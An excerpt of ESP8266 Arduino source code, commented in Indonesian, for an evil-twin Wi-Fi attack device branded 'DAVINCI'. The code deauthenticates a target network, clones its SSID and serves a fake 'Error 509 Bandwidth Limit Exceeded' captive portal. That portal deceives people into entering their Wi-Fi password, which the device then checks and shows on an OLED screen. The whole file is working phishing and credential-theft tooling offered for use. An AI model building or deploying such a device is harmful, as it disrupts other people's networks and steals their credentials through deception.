...
//Oled 0.66
/*===== SETTINGS =====*/
 //SSD1306 display(0x3c, 4, 5);  //balik ini bila OLED tidak muncul
SH1106 display(0x3c, 4, 5);  //balik ini bila OLED tidak muncul

#define SUBTITLE "WiFi Error 509 Bandwidth Limit Exceeded."
#define TITLE ""
#define BODY "Koneksi atau router anda telah terkunci. Dikarenakan terdapat Error 509 Bandwidth Limit Exceeded. Masukkan sandi WiFi anda yang benar untuk memulai ulang koneksi anda."
#define POST_TITLE ""
#define POST_BODY "Harap tunggu sebentar sedang melakukan checking password..."
int relay = D0;  
int buzzer = D7; 
...
String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' >" +
    "<b>Masukan Password:</b> <center><input type=password name=password></input><input type=submit value=\"RESTART CONNECTION\"></form></center>" + footer();
}
String posted() {
  return header(POST_TITLE) + POST_BODY + "<script> setTimeout(function(){window.location.href = '/result';}, 15000); </script>" + footer();
}
String footer() { 
  return "</div><div class=q><a>&#169; Error Code 509.</a></div>";
}
/* start Display OLED */
void setup() {
  ...
  /* show start screen */
  display.clear();
  display.drawString(35, 16, "DAVINCI");
  display.drawString(35, 30, "=============================");
  display.drawString(35, 40, "1400 GANG");
  display.drawString(35, 50, "BIG 14");
  display.display();
  delay(5000);
  Serial.begin(115200);
...
void handleResult() {
  ...
  if (WiFi.status() != WL_CONNECTED) {
    ...
    display.clear();
    display.drawString(35, 16, "Pass Yang");
    display.drawString(35, 30, "Dimasukan");
    display.drawString(35, 40, "Salah -_-");
    display.drawString(35, 50, "Loading...");
    display.display();  
    delay(500);  
    
    //Buzzer when Password Salah
    ...
    webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Password Benar</h2></body> </html>");
   ...
   dnsServer.stop();
    ...
    WiFi.softAP("DAVINCI", "wings321");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    _correct = "<passfont>" +_selectedNetwork.ssid + " Password WiFi: " + _tryPassword +"</passfont>";
    Serial.println("Password Benar!");

    display.clear();
    display.drawString(35, 30, "Pass Benar!");
    display.display();
    delay(1000);
    
    //Buzzer when Password Benar
...
.table td:before{
  ...
  text-align: left;
    ...
    <body>
        <div class='content'>
                <p>
                   <center><h3 style="color: #e8f047;">[ 1400 GANG ]</h3></center>
                           </p>
                    <h3 style="color: #FF0085;" class="heading">DAVINCI</h3>                                            
...
void handleIndex() {
  ...
  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      ...
      deauthing_active = true;
      display.clear();
      display.drawString(35,16, "Deau & Clon");
      display.drawString(35, 30, "WiFi Target");
      display.drawString(35,40, "=============================");
      display.drawString(35, 50, _selectedNetwork.ssid.c_str());
      display.display();     
 ...
 if (hotspot_active == false) {
    ...
    if (webServer.hasArg("password")) {
      ...
      //--------------------OLED -----------
    display.clear();
    display.drawString(35, 16, "Target Kena");
    display.drawString(35, 30, "Perangkap");
    display.drawString(35, 40, "Cek Pass");
    display.drawString(35, 50, "Loading...");
    display.display();  
...
void loop() {
  ...
  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      ...
      //--------------------OLED -----------
    display.clear();
    display.drawString(35, 16, "Pass WiFi");
    display.drawString(35, 30, _selectedNetwork.ssid.c_str());
    display.drawString(35, 40, "=============================");
    display.drawString(35, 50, _tryPassword);
    display.display();
    }
    wifinow = millis();
  }
